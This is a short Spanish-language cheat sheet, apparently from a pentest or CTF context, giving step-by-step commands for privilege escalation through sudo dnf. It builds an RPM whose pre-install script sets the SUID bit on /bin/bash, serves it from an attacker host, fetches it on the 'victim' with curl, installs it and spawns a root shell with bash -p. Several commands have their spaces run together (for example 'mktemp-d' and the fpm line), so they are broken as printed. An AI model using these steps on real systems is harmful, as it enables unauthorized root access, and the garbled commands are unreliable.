## Desde la maquina atacante:

```bash
sudo apt install ruby-full build-essential -y

sudo gem install fpm
```

Crear el archivo

```
TF=$(mktemp-d)
echo'chmod u+s /bin/bash'> $TF/x.sh
fpm-nx-sdir-trpm-aall--before-install $TF/x.sh $TF
```

```bash
python3 -m http.server 80
```

## Desde la maquina víctima

```
cd /tmp
curl-Ohttp://<IP_ATTACKER>/x-1.0-1.noarch.rpm
```

y ejecutar:

```bash
sudo dnf install -y x-1.0-1.noarch.rpm
```

## Comprobar permisos:

```bash
ls -la /bin/bash

bash -p
```
